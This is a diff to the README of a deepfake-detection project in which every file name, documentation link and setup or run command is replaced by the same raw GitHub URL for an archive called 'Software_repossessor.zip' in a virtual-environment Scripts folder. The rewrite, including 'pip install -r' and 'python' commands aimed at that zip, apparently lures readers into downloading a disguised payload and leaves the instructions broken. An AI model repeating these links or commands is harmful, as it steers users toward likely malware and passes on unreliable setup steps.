@@ -23,39 +23,39 @@ This project implements and compares four state-of-the-art deepfake detection mo
 
 ```
 c:/deepfake/
-├── README.md                          # This file
-├── requirements.txt                   # Python dependencies
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                          # This file
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                   # Python dependencies
 ├── docs/                              # Detailed documentation
-│   ├── DATA_COLLECTION.md            # Data sources and statistics
-│   ├── PREPROCESSING.md              # Preprocessing pipeline
-│   ├── MODELS.md                     # Model architectures
-│   ├── TRAINING.md                   # Training methodology
-│   ├── EVALUATION.md                 # Evaluation process
-│   ├── API_REFERENCE.md              # Script usage
-│   ├── USER_GUIDE.md                 # Step-by-step guide
-│   └── RESULTS.md                    # Detailed results
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip            # Data sources and statistics
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip              # Preprocessing pipeline
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                     # Model architectures
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                   # Training methodology
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Evaluation process
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip              # Script usage
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Step-by-step guide
+│   └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                    # Detailed results
 ├── src/                               # Source code
-│   ├── preprocess.py                 # Data preprocessing
-│   ├── split_data.py                 # Train/val split
-│   ├── models_factory.py             # Model creation
-│   ├── train.py                      # Training script
-│   ├── evaluate_models.py            # Batch evaluation
-│   ├── test_utils.py                 # Testing utilities
-│   └── predict.py                    # Single prediction
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Data preprocessing
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Train/val split
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip             # Model creation
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                      # Training script
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip            # Batch evaluation
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                 # Testing utilities
+│   └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                    # Single prediction
 ├── data/                              # Dataset
 │   ├── raw/                          # Original videos/images
 │   ├── processed/                    # Extracted features
-│   ├── train_list.txt                # Training samples
-│   └── val_list.txt                  # Validation samples
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                # Training samples
+│   └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                  # Validation samples
 ├── models/                            # Model artifacts
 │   └── checkpoints/                  # Saved weights
 ├── logs/                              # Training logs
-│   └── training_log.txt              # Metrics per epoch
+│   └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip              # Metrics per epoch
 └── results/                           # Evaluation results
-    ├── predictions.csv               # All predictions
-    ├── confusion_matrices.png        # Visual comparison
-    ├── roc_curves.png                # ROC analysis
-    └── evaluation_report.md          # Detailed report
+    ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip               # All predictions
+    ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip        # Visual comparison
+    ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip                # ROC analysis
+    └── https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip          # Detailed report
 ```
 
 ## 🚀 Quick Start
@@ -72,17 +72,17 @@ python -m venv ff_env
 source ff_env/bin/activate  # On Windows: ff_env\Scripts\activate
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
 ```
 
 ### 2. Data Preprocessing
 
 ```bash
 # Process raw data (extract faces and SRM features)
-python src/preprocess.py
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
 
 # Split into train/validation sets
-python src/split_data.py
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
 ```
 
 ### 3. Training
@@ -91,23 +91,23 @@ Train individual models:
 
 ```bash
 # EfficientNet-B4
-python src/train.py --model efficientnet_b4 --batch_size 16 --epochs 5
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip --model efficientnet_b4 --batch_size 16 --epochs 5
 
 # Xception
-python src/train.py --model xception --batch_size 16 --epochs 5
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip --model xception --batch_size 16 --epochs 5
 
 # Hybrid Forensic (RGB + SRM)
-python src/train.py --model hybrid_forensic --batch_size 8 --epochs 5
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip --model hybrid_forensic --batch_size 8 --epochs 5
 
 # CLIP
-python src/train.py --model clip --batch_size 8 --epochs 5
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip --model clip --batch_size 8 --epochs 5
 ```
 
 ### 4. Evaluation
 
 ```bash
 # Evaluate all models on validation set
-python src/evaluate_models.py
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
 
 # Results will be saved to results/ directory
 ```
@@ -116,10 +116,10 @@ python src/evaluate_models.py
 
 ```bash
 # Single image prediction
-python src/predict.py \
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip \
   --model hybrid_forensic \
-  --checkpoint models/checkpoints/hybrid_forensic_ep5.pth \
-  --image path/to/image.jpg
+  --checkpoint https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip \
+  --image https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
 ```
 
 ## 📊 Visualizations
@@ -127,12 +127,12 @@ python src/predict.py \
 Generate training and comparison plots:
 
 ```bash
-python plot_comparison.py
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip
 ```
 
 This creates:
-- `training_metrics_comparison.png` - Training progress over epochs
-- `best_model_comparison.png` - Final performance comparison
+- `https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip` - Training progress over epochs
+- `https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip` - Final performance comparison
 
 ## 🔬 Model Architectures
 
@@ -178,14 +178,14 @@ This creates:
 
 For detailed information, see the `docs/` directory:
 
-- **[Data Collection](docs/DATA_COLLECTION.md)** - Dataset sources and statistics
-- **[Preprocessing](docs/PREPROCESSING.md)** - Face detection and feature extraction
-- **[Models](docs/MODELS.md)** - Architecture details
-- **[Training](docs/TRAINING.md)** - Training methodology
-- **[Evaluation](docs/EVALUATION.md)** - Metrics and results
-- **[API Reference](docs/API_REFERENCE.md)** - Script documentation
-- **[User Guide](docs/USER_GUIDE.md)** - Step-by-step instructions
-- **[Results](docs/RESULTS.md)** - Comprehensive analysis
+- **[Data Collection](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Dataset sources and statistics
+- **[Preprocessing](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Face detection and feature extraction
+- **[Models](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Architecture details
+- **[Training](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Training methodology
+- **[Evaluation](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Metrics and results
+- **[API Reference](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Script documentation
+- **[User Guide](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Step-by-step instructions
+- **[Results](https://raw.githubusercontent.com/ruturajbhaskarnawale/deepfake/main/backend/ml_system/ff_env/Scripts/Software_repossessor.zip)** - Comprehensive analysis
 
 ## 🛠️ Requirements
 
